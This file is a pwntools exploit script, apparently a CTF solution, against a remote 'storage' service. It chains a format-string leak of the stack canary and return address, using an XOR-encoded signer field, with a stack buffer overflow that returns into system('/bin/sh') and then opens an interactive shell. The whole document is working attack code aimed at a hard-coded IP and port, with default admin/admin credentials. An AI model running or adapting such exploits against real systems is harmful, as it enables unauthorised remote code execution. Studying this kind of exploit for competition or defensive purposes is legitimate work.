from pwn import *

# r = process('./storage')
host = "185.66.87.233"
port = 5006
r = remote(host, port)
gdb.attach(r, ''' 
set follow-fork-mode parent
b*0x804a4de
b*0x804a50a
b*0x804a82d
c
''') 


def upload(name, data):
    r.recvuntil('> ')
    payload = ''
    payload += '2'
    r.sendline(payload)

    r.recvuntil(': ')
    payload = ''
    payload += name
    r.sendline(payload)

    r.recvuntil(': ')
    payload = ''
    payload += data
    r.sendline(payload)

def sign(name, signer):

    r.recvuntil('> ')
    payload = ''
    payload += '4'
    r.sendline(payload)

    r.recvuntil(': ')
    payload = ''
    payload += name
    r.sendline(payload)

    r.recvuntil(': ')
    payload = ''
    payload += signer
    r.sendline(payload)


def add_info(name, v0, v1, v2):
    
    # r.recvuntil('> ')
    payload = ''
    payload += '5'
    r.sendline(payload)

    r.recvuntil(': ')
    payload = ''
    payload += name
    r.sendline(payload)

    r.recvuntil(': ')
    payload = ''
    payload += v0
    r.sendline(payload)

    r.recvuntil(': ')
    payload = ''
    payload += v1
    r.sendline(payload)

    r.recvuntil(': ')
    payload = ''
    payload += v2
    r.sendline(payload)

r.recvuntil('Login: ')
payload = ''
payload += 'admin'
r.sendline(payload)

r.recvuntil('Password: ') 
payload = ''
payload += 'admin'
r.sendline(payload)

name = "hoge"
data = "fuga"
upload(name, data)

md5hash = "11c9c5d7c37e614b4d99eea11672227e"
fsb = "%94$x.%95$x." 

signer = ''
for i in range(0, len(fsb)):
    signer += chr(ord(fsb[i]) ^ int(md5hash[2*i:2*i+2], 16))


sign(name, signer)
print r.recvuntil('sign: ')
leak = r.recvuntil('> ')
print leak
leak = leak.split('\nSelect')[0][:-10]
ret_addr = int(leak.split('.')[0], 16) - 0x1cc
canary = int(leak.split('.')[1], 16)
# -0x1cc: ret addr
print len(leak)
print "ret_addr: ", hex(ret_addr)
print "canary: ", hex(canary)

x = "A" * 256
x += p32(canary)
x += "B" * 12
x += p32(0x08052cf0) # system
x += p32(0xdeadbeef)
x += p32(0x080C7B8C) # /bin/sh
y = "piyo"
z = "nyao"

add_info(name, y, z, x)

r.interactive()
r.close() 
